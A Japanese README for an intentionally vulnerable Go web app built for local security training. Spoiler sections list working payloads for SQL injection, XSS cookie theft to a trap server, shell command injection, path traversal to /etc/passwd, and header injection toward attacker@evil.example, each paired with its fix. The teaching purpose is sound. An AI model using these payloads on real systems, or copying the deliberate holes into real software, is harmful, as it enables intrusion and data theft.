# vuln-lab

脆弱性を体験して学ぶための、**意図的に脆弱な** Web アプリケーションです。

> ⚠️ **ローカル学習専用です。** 絶対にインターネットへ公開したり、本番環境・他人の環境で動かさないでください。
> サーバーは `127.0.0.1` のみで待ち受けます。自分が管理していない他者のシステムへの攻撃には使わないでください。

## 方針

- 言語: Go(標準ライブラリ中心: `net/http`、`html/template`)
- DB: Cloud Spanner エミュレーター(`github.com/googleapis/go-sql-spanner` の `database/sql` ドライバー)。実際の Google Cloud には接続しない。スキーマと初期データは `sql/` の SQL ファイル(GoogleSQL)を `go:embed` で埋め込み、起動時に実行する
- 学習形式: **脆弱版のみ**。各画面に「攻撃のヒントと、なぜ危険か・本来どう直すか」の解説を載せる
- 安全策: `127.0.0.1` バインド、起動時ログと画面上の警告表示

## 体験できる脆弱性

| 脆弱性 | 画面 |
|---|---|
| SQLインジェクション | ログインフォーム `/sqli/login`、商品検索 `/sqli/search` |
| XSS(反射型) | 検索結果表示 `/xss/reflected` + 攻撃者の罠ページ `:9090/xss/` と、盗んだ Cookie の戦利品ページ `:9090/xss/loot` |
| XSS(格納型) | 掲示板コメント `/xss/board` |
| CSRF | パスワード変更/送金フォーム `/csrf/account` + 攻撃者の罠ページ(別オリジン `:9090`) |
| コマンドインジェクション | ping 画面 `/cmdi/ping` |
| パストラバーサル | ファイル閲覧画面 `/path/view`(マルチテナント越境あり) |
| メールヘッダインジェクション | お問い合わせフォーム `/mail/contact`(入力したアドレスへの自動返信メールを組み立ててプレビュー表示。`SMTP_ADDR` 設定時は smtp4dev に実際に送信) |
| HTTPヘッダインジェクション | リダイレクト `/header/redirect`(`http.Hijacker` で `net/http` の保護をバイパス) |
| アクセス制御・認可制御の欠落 | メールアドレスのみのログイン `/authz/login`、プロフィール `/authz/profile?id=N`(IDOR)、管理画面 `/authz/admin`(権限チェックなし) |
| クリックジャッキング | ログイン `/clickjack/login`、設定画面 `/clickjack/settings` + 攻撃者の罠ページ `:9090/clickjack/` |
| セッション管理の不備 | ログイン `/session/login`、マイページ `/session/home`(連番のセッションID、固定化、HttpOnly なし)+ 攻撃者の罠ページ `:9090/session/` |

各画面には、ページ内に「攻撃のヒント」「なぜ危険か / 本来どう直すか」の解説を折りたたみで載せています。まずは解説を開かずに自力で攻撃を試し、詰まったら開いてください。

## 作業計画(段階的に進める)

各段階の完了ごとに確認を取ってから次へ進む。

- [x] 段階1: プロジェクト雛形(`go.mod`、トップページ、共通レイアウト、警告表示、localhost バインド)
- [x] 段階2: SQLインジェクション(ログイン、商品検索。DB にダミーデータ)
- [x] 段階3: XSS(反射型: 検索結果、格納型: 掲示板)
- [x] 段階4: CSRF(ログイン機能、状態変更フォーム、罠ページ)
- [x] 段階5: コマンドインジェクション(ping)とパストラバーサル(ファイル閲覧)
- [x] 段階6: 各画面の解説文、本 README への起動方法・攻撃例・対策の考え方の追記
- [x] 段階7: メールヘッダインジェクション(お問い合わせフォーム。プレビュー表示。`make up` では smtp4dev へ実送信)
- [x] 段階8: HTTPヘッダインジェクション/レスポンス分割(`http.Hijacker` で `net/http` の保護を意図的にバイパス)
- [x] 段階9: クリックジャッキング(IPA「安全なウェブサイトの作り方」1.9。framing を禁止しない設定画面と、透明 iframe の罠ページ)
- [x] 段階10: アクセス制御や認可制御の欠落(同 1.11。メールアドレスのみのログイン、id 差し替え、管理画面の権限チェック欠落)
- [x] 段階11: セッション管理の不備(同 1.4。連番のセッションID、固定化、HttpOnly なしの Cookie)
- [x] 段階12: 学習しやすさの改善(共通ヘッダの IPA/CWE バッジとログイン表示、罠ページ移動前の解説ダイアログ(罠サーバーの起動確認つき)、「サーバー内部で何が起きたか」パネル(cmdi・パストラバーサル・認可・セッション・CSRF)、ログイン画面と管理画面の入力例ボタン、トップの「学習の進め方」、「本来の対策」のコード例(SQLi・cmdi・XSS・CSRF・セッション))
- 同 1.10 バッファオーバーフローは、Go がメモリ安全な言語のため再現せず、静的な解説ページ `/bof` のみ

## プロジェクト構成

- `sql/`: スキーマ(`01.create-table.sql`)と初期データ(`03.organization-seed.sql`)。`go:embed` でバイナリに埋め込まれる
- `templates/`: HTML テンプレート。こちらも `go:embed` で埋め込まれるため、実行時のカレントディレクトリに依存しない
- `docs/`: パストラバーサル画面(`/path/view`)の閲覧対象。DB の初期化とは無関係

## 起動方法

DB は Cloud Spanner エミュレーターに接続する(実際の Google Cloud には接続しない)。`SPANNER_EMULATOR_HOST` が未設定、または `spanner` / `localhost` / `127.0.0.1` 以外のホストなら、起動を拒否する。

### ホストで起動する(デフォルト)

エミュレーターと smtp4dev(開発用SMTPサーバー)を Docker compose(`compose.yml`)で起動し、アプリはホストから `go run` する。`Makefile` に起動用のターゲットがある。`SPANNER_EMULATOR_HOST` は未設定なら `127.0.0.1:9010`、`SMTP_ADDR` は未設定なら `127.0.0.1:2525` を使う。

```sh
make emulator   # Spanner エミュレーターと smtp4dev を起動(Docker が必要)
make up         # 本体(8080)と罠サーバー(9090)を同時に起動。Ctrl-C で両方止まる
```

| ターゲット | 内容 |
|---|---|
| `make up` | 本体と罠サーバーを同時に起動する。どちらかが終了したら、もう一方も止める |
| `make run` | 本体のみ起動する |
| `make trap` | 罠サーバーのみ起動する |
| `make emulator` / `make emulator-down` | Spanner エミュレーターと smtp4dev を起動 / 停止する |
| `make vet` | 本体と `trap/` の両方で `go vet` を実行する |

- アプリ: http://127.0.0.1:8080/ 、罠ページ: http://127.0.0.1:9090/ (別モジュール `trap/` のため `go run .` では起動しない。`make up` で同時に起動するか、別のターミナルで `cd trap && go run .` を実行する。VS Code の起動構成 `Launch vuln-lab + Trap` でも起動できる)
- 受信メールの確認(smtp4dev UI): http://127.0.0.1:5000/
- 起動時に `sql/` のスキーマを適用し、テーブルが空なら初期データを投入する(インスタンスとデータベースはエミュレーター上に自動で作られる)
- `/mail/contact` のメールは smtp4dev に実際に送信される。smtp4dev は受信したメールを保存するだけで、外部には中継しない。メールをプレビュー表示のみにしたい場合は `SMTP_ADDR= make up` のように空にして起動する
- `SMTP_ADDR` のホストは `smtp4dev` / `localhost` / `127.0.0.1` に限定している(実在のSMTPサーバーへ誤って送信しないため)
- Spanner(9010)、smtp4dev の SMTP(2525)と UI(5000)は、ホストの `127.0.0.1` にのみ公開する

`make` を使わない場合は、次のとおり。罠サーバーは別モジュール(`trap/`)なので、別のターミナルで起動する。

```sh
docker compose up -d spanner smtp4dev
SPANNER_EMULATOR_HOST=127.0.0.1:9010 SMTP_ADDR=127.0.0.1:2525 go run .
cd trap && go run .   # 別のターミナルで
```

### devcontainer で起動する(任意)

VS Code の Dev Containers を使える環境向け。`.devcontainer/` は、ルートの `compose.yml` に、アプリ用コンテナ(`app`)の差分を重ねる構成になっている。「Dev Containers: Reopen in Container」で開き、コンテナ内で `go run .` を実行する。`SPANNER_EMULATOR_HOST=spanner:9010` と `SMTP_ADDR=smtp4dev:25` が自動で設定される。ポートは VS Code が転送する。

現在のページ:
- `/`(トップ)
- `/sqli/login`(SQLインジェクション: ログイン)
- `/sqli/search`(SQLインジェクション: 商品検索)
- `/xss/reflected`(XSS: 反射型)
- `/xss/board`(XSS: 格納型の掲示板。「初期状態に戻す」ボタンあり)
- `/csrf/login`(CSRF: ログイン。`alice` / `password1` など)
- `/csrf/account`(CSRF: パスワード変更・送金フォーム。「初期状態に戻す」ボタンあり)
- 罠ページ: http://127.0.0.1:9090/ (攻撃者サイト役。別モジュール `trap/` のため、`go run .` では起動しない。`cd trap && go run .` で別途起動するか、`make up` や VS Code の `Launch vuln-lab + Trap` で本体と同時に起動する)
  - 反射型XSSの罠: http://127.0.0.1:9090/xss/ (被害者に踏ませるリンク)
  - 戦利品: http://127.0.0.1:9090/xss/loot (盗み出された Cookie を新しい順に表示。3秒ごとに自動更新。メモリ上のみで、罠サーバーの再起動で消える)
- `/cmdi/ping`(コマンドインジェクション: ping。実際にシェルを実行する)
- `/path/view`(パストラバーサル: `docs/` 配下のファイル閲覧)
- `/mail/contact`(メールヘッダインジェクション: お問い合わせフォーム。`SMTP_ADDR` 設定時のみ smtp4dev に実送信、未設定ならプレビューのみ)
- `/header/redirect`(HTTPヘッダインジェクション: リダイレクト。`http.Hijacker` で生のレスポンスを組み立てる)
- `/authz/login`(アクセス制御・認可制御の欠落: メールアドレスだけでログイン。セッションは CSRF 画面と共通)、`/authz/profile`(id を差し替えられるプロフィール)、`/authz/admin`(権限チェックのない管理画面)
- `/clickjack/login`(クリックジャッキング: ログイン。セッションは CSRF 画面と共通で、表示だけ分けている)と `/clickjack/settings`(プロフィール公開ボタン。罠ページは http://127.0.0.1:9090/clickjack/ )
- `/session/login`(セッション管理の不備: ログイン。専用の Cookie `sid` を使い、ログイン前にもIDを発行する)と `/session/home`(マイページ。罠ページは http://127.0.0.1:9090/session/ )

XSS の画面では、盗み出す対象として `HttpOnly` なしのデモ用 Cookie(`demo_session`)を発行します。

### データを初期状態に戻す

攻撃を試した結果、画面が壊れたりデータが変わったりしても、次の方法で初期状態に戻せます。

- 主なデータをまとめてリセット: トップページの「全データを初期状態に戻す」ボタン(`POST /reset-all`。CSRF の残高・パスワード、XSS 掲示板、クリックジャッキングの公開状態、認可の権限を戻す)
- 全体をまとめてリセット: エミュレーターのコンテナを再起動する(データはメモリ上だけなので消える)。続けてアプリを再起動すると初期データが入る(最も確実)
- 掲示板のみ: `/xss/board` の「掲示板を初期状態に戻す」ボタン
- CSRFの残高・パスワードのみ: `/csrf/account` の「残高とパスワードを初期状態に戻す」ボタン(`/sqli/login` の `admin` 等のパスワードも一緒に戻る)

## 攻撃例(ネタバレ。まず自力で試してみてください)

<details>
<summary>SQLインジェクションの答え</summary>

**ログイン(`/sqli/login`)**
- 認証回避: ユーザー名 `admin'--`、パスワードは任意(`--` 以降がコメントになりパスワード条件が消える)
- 認証回避: ユーザー名は任意、パスワード `' OR '1'='1`(条件が常に真になる)
- エラー誘発: ユーザー名 `'`(DBエラーが画面に表示される)

**商品検索(`/sqli/search`)**
- 非公開商品の閲覧: `' OR 1=1 --`
- 他テーブルの窃取(UNION): `zzz' UNION ALL SELECT id, username, password, 0 FROM accounts --`(Spanner は `UNION ALL` / `UNION DISTINCT` が必須で、列の型も合わせる。`role`(文字列)を4列目に置くと型の不一致でエラーになる)
- テーブル構造の調査: `zzz' UNION ALL SELECT 1, table_name, column_name, 0 FROM information_schema.columns WHERE table_schema = '' --`

**本来の対策**: プレースホルダ(`?`)でバインドする。パスワードはハッシュ化して保存する。DBエラーは画面に出さずログへ。DBユーザーの権限を最小化する。

</details>

<details>
<summary>XSS の答え</summary>

**反射型(`/xss/reflected`)**
- キーワードに `<script>alert(1)</script>` または `<img src=x onerror=alert(1)>`
- Cookie の表示: `<img src=x onerror=alert(document.cookie)>`
- URL に細工して他人に開かせる: `/xss/reflected?q=<URLエンコードしたペイロード>`
- Cookie を攻撃者サーバーへ送る: 別タブで http://127.0.0.1:9090/xss/loot を開いたまま、http://127.0.0.1:9090/xss/ の「景品を受け取る」を踏むと、`demo_session` が戦利品ページに表示される(事前に標的サイトを開く必要はない)

**格納型(`/xss/board`)**
- 本文に `<script>alert('stored')</script>` を投稿し、再読み込みする(名前欄も同様)
- Cookie を攻撃者サーバーへ送る: 別タブで http://127.0.0.1:9090/xss/loot を開いたまま、本文に `<img src=x onerror="new Image().src='http://127.0.0.1:9090/xss/steal?c='+encodeURIComponent(document.cookie)">` を投稿し、掲示板を開き直す(画面の「Cookieを攻撃者サーバーへ送る」ボタンで入力できる)。リンクを踏ませなくても、掲示板を開いた人全員の `demo_session` が戦利品ページに並ぶ
- ページが操作不能になったら「掲示板を初期状態に戻す」を押す

**本来の対策**: 出力時にエスケープする(`html/template` に文字列のまま渡し、`template.HTML` へ変換しない)。Cookie に `HttpOnly` を付ける。`Content-Security-Policy` を設定する。HTMLを許可する場合は許可リスト方式のサニタイザを使う。

</details>

<details>
<summary>CSRF の答え</summary>

1. `/csrf/login` で `alice` / `password1` としてログインする(ログインしたままにする)。
2. 同じブラウザの別タブで http://127.0.0.1:9090/ を開く。
3. 「プレゼントを受け取る」: 自動送信フォームが `/csrf/transfer` に POST され、alice から bob へ 30000 円が送金される。
4. 「アンケートに答える」: `/csrf/password` に POST され、alice のパスワードが `hacked` に変わる。
5. `/csrf/account` を再読み込みして残高を確認する。パスワードは再ログインで確認する。

罠ページと本体は別オリジン(ポートが違う)だが、`127.0.0.1` は同一サイトなので `SameSite=Lax` 既定でも Cookie が送られる。

**本来の対策**: CSRFトークンをフォームに埋め込んで検証する。`SameSite=Lax/Strict` を指定する。`Origin` / `Referer` を検証する。重要操作では現在のパスワードの再入力(再認証)を求める。

</details>

<details>
<summary>コマンドインジェクションとパストラバーサルの答え</summary>

**コマンドインジェクション(`/cmdi/ping`)**
- ホストに `127.0.0.1; id`(`;` で別のコマンドを続ける)
- ホストに `127.0.0.1 && ls`
- ホストに `$(whoami)`(シェルが先に評価する)

**パストラバーサル(`/path/view`)**
- マルチテナント構成の模擬: 自組織(株式会社アルファ、`docs/org1/`)から、他組織(ベータ合同会社)のディレクトリへ
  - `../org2/welcome.txt`
  - `../org2/contract.txt`(ベータ合同会社の社外秘ダミー文書)
- `../../go.mod`(`docs/` の一つ上のファイル)
- `../../secret/api_key.txt`(非公開のダミーキー)
- `../../../../../../../etc/passwd`(OS のファイル)

**本来の対策**
- コマンドインジェクション: シェルを使わず `exec.Command("ping", "-c", "1", host)` と引数を分ける。ホスト名を許可リストで検証する。
- パストラバーサル: `filepath.Clean` 後にベースディレクトリ配下か検証する。`os.Root` を使う。ファイル名を ID に対応付ける。

</details>

<details>
<summary>メールヘッダインジェクションの答え</summary>

**お問い合わせフォーム(`/mail/contact`)**
- 入力したメールアドレス宛に、サポート窓口を差出人とした自動返信が届く。他人(被害者役の `victim@example.com`)のアドレスを入れ、件名に細工すると、その人に偽のメールを届けられる
- 件名に `お問い合わせ` + 改行 + `Bcc: attacker@evil.example` を仕込むと、メールに `Bcc` ヘッダが追加される
- ブラウザの1行入力欄には改行を直接打ち込みにくいため、件名は改行を入れられる複数行の入力欄にしてある。画面の「入力例を入れる」ボタンで改行入りの例を入れて送信するか、`curl` で直接試す
  ```sh
  curl -d "name=A&email=victim%40example.com&subject=Hi%0D%0ABcc: attacker%40evil.example&body=Hello" http://127.0.0.1:8080/mail/contact
  ```
- メールアドレス欄に改行を入れると、`net/smtp` が宛先(`RCPT TO`)の検証で拒否する(`smtp: A line must not contain CR or LF`)。件名・お名前は検証されないので注入できる
- `Bcc:` を足しても、実際の配送先(SMTP の `RCPT TO`)は変わらない。smtp4dev で受信メールのヘッダに現れるだけ。代わりに、被害者に届くメールの中身を書き換える注入が確認できる(画面の「入力例を入れる」ボタン)
  - 偽の文言の差し込み: 件名に `お問い合わせ` + 改行2つ + `【重要】…` → ヘッダが終わり、続きが本文になる
  - HTMLメールへの差し替え: 件名に `Content-Type: text/html` と HTML、末尾に `<!--` → 本文が HTML になり、元の本文はコメントに隠れる
  - Reply-To の注入: 件名に `お問い合わせ` + 改行 + `Reply-To: attacker@evil.example` → 返信先が攻撃者になる

**本来の対策**: メールアドレス・件名など1行であるべき値に `\r` `\n` を含めない(含まれていれば拒否する)。`net/mail.ParseAddress` のような、ヘッダを安全に組み立てる仕組みを使い、文字列連結を避ける。

</details>

<details>
<summary>HTTPヘッダインジェクションの答え</summary>

**リダイレクト(`/header/redirect`)**
- 画面の「入力例を入れる」ボタンで `next` 欄に例を入れて「移動」を押す(欄は改行を保持できる複数行)
- `Set-Cookieを注入する`(`next=/header/redirect%0D%0ASet-Cookie: admin=true`): レスポンスに `Set-Cookie` ヘッダが追加され、画面に戻ると「ブラウザが送ってきた Cookie」に `admin=true` が現れる
- `ページ内容ごと差し替える`(`next=%0D%0AContent-Type: text/html%0D%0A%0D%0A<html>...`): `Location` を空にして追従を止め、ヘッダを終端する空行ごと注入して、続きをレスポンス本文として表示させる(ブラウザによって挙動が異なる場合がある)
- `curl -i "http://127.0.0.1:8080/header/redirect?next=%2F%0D%0ASet-Cookie%3A%20admin%3Dtrue"` で生のレスポンスを直接確認できる

Go の `net/http` は `w.Header().Set` や `http.Redirect` を使う限りこの注入を防ぐため、この画面は `http.Hijacker` で接続を乗っ取り、意図的にその保護をバイパスしている。

**本来の対策**: `http.Hijacker` で生レスポンスを自作しない(標準APIに任せる)。リダイレクト先に改行を含めない。リダイレクト先を許可リスト化する。

</details>

<details>
<summary>クリックジャッキングの答え</summary>

1. `/clickjack/login` で `alice` / `password1` としてログインする(ログインしたままにする)。
2. 同じブラウザの別タブで http://127.0.0.1:9090/clickjack/ を開き、「景品に応募する」を押す。
3. `/clickjack/settings` を再読み込みすると、プロフィールが「公開中」になっている(押したのは、透明な iframe 内の本物のボタン)。
4. 罠ページの URL に `?debug=1` を付けると、iframe を半透明にして重なりを確認できる。
5. 「プロフィールを非公開に戻す」ボタンで初期状態に戻せる。

CSRF と違い、本物のページ上で本人がクリックしているため、CSRFトークンや Cookie の検証では防げない。

**本来の対策**: `X-Frame-Options: DENY`(または `SAMEORIGIN`)と `Content-Security-Policy: frame-ancestors 'none'`(または `'self'`)を付ける。重要な操作ではパスワード再入力など、クリックだけでは完了しない確認を挟む。

</details>

<details>
<summary>アクセス制御・認可制御の欠落の答え</summary>

**メールアドレスのみのログイン(`/authz/login`)**
- パスワード欄がない。`alice@example.com` や `admin@example.com`(`ユーザー名@example.com`)を入れるだけで、その人としてログインできる

**id の差し替え(`/authz/profile?id=N`)**
- `alice@example.com` でログインし、URL を `/authz/profile?id=1` に変えると、管理者(`admin`)のメールアドレス・権限・残高が見える。`id=3` なら `bob`

**管理画面の強制ブラウジング(`/authz/admin`)**
- 一般利用者の `alice` でログインしたまま `/authz/admin` を開くと、全アカウントが見え、「管理者にする」で自分を昇格できる(画面を開かず `curl -b 'csrf_session=...' -d id=2 http://127.0.0.1:8080/authz/admin/promote` でも可)
- 「権限を初期状態に戻す」ボタンで元に戻せる

**本来の対策**: パスワード等の秘密情報による認証を必須にする(11-(i))。利用者の id は URL ではなくセッションから決めるか、ログイン中の本人の id と一致するかを毎回確認する(11-(ii))。管理者向け機能は、リンクを隠すだけでなく、リクエストごとにサーバー側で role を確認する。

</details>

<details>
<summary>セッション管理の不備の答え</summary>

**セッションIDの推測**
1. `curl -i -c /dev/null http://127.0.0.1:8080/session/login` を数回実行すると、`Set-Cookie: sid=1001`、`1002`、… と連番で発行される。
2. 実際の利用者(例: `alice`)がログインした直後に、攻撃者が `curl -b sid=番号 http://127.0.0.1:8080/session/home` を前後の番号で試すと、その利用者のマイページが開ける。

**セッションIDの固定化**
1. 攻撃者が `/session/login` を開いて `sid` を 1 つ受け取る(または `31337` のように自分で決める)。
2. 被害者に `http://127.0.0.1:8080/session/login?sid=31337` を踏ませる(罠ページ http://127.0.0.1:9090/session/ のリンク)。
3. 被害者がそのままログインする。ログイン後もIDが変わらない。
4. 攻撃者が `curl -b sid=31337 http://127.0.0.1:8080/session/home` を実行すると、被害者としてマイページが開ける。

**盗用**
- `/session/home` の「JavaScript から読める Cookie」欄に `sid` が見える(`HttpOnly` なし)。XSS の画面で任意のスクリプトを動かせれば `document.cookie` で盗める。

**本来の対策**: セッションIDは `crypto/rand` で十分な長さの乱数にする。ログイン成功時にIDを発行し直す。URL のIDを受け付けない。Cookie に `HttpOnly` / `Secure` / `SameSite` を付け、サイト全体を HTTPS にする。ログアウト時にサーバー側のセッションを破棄する。

</details>

## 対策の考え方(共通原則)

個別の対策は各画面の解説に書いていますが、6つの脆弱性にはいくつか共通する考え方があります。

- **信頼境界をまたぐ入力はすべて疑う**: フォーム・URLパラメータ・Cookie など、利用者から来る値は、見た目が正しそうでも検証・無害化するまで信用しない。「このアプリの利用者は悪意を持たない」という前提を置かない。
- **「組み立て」ではなく「分離」で渡す**: SQL・シェルコマンド・HTML のいずれも、入力値を文字列として組み立てる(連結する)と、構文の一部として解釈されてしまう。
  - SQL → プレースホルダ(バインド変数)
  - シェルコマンド → `exec.Command` の引数配列(シェルを経由しない)
  - HTML → 自動エスケープするテンプレートエンジンにそのまま渡す(`html/template` では文字列のまま)
- **出力時にも守る(多層防御)**: 入力検証をすり抜けても被害を抑えられるよう、出力・実行の直前でも対策する(エスケープ、プレースホルダ、許可リストでのパス検証)。CSRFトークン・`SameSite` Cookie・`Content-Security-Policy` のような「もう一段の壁」を重ねる。
- **最小権限**: DBユーザーの権限、アプリの実行ユーザーの権限、Cookie の権限(`HttpOnly`)などを必要最小限にし、一つの脆弱性が突破されても被害を小さくする。
- **マルチテナントでは「自分のものか」を必ず確認する**: `/path/view` のように、組織IDからパスやキーを機械的に作るだけでは不十分。アクセスのたびに「要求されたリソースが、本当にこの利用者(テナント)の所有物か」をDB等で確認する。
- **エラー情報を外に出さない**: DBエラーやOSのエラーメッセージをそのまま画面に出すと、攻撃者に内部構造のヒントを与える。詳細はログにのみ残し、画面には一般的なメッセージを出す。
- **攻撃者視点で自分のアプリを見る**: 「この入力欄に何を入れたら、意図しない動作を起こせるか」を都度考える習慣が、脆弱性の作り込みを防ぐ最初の一歩になる。
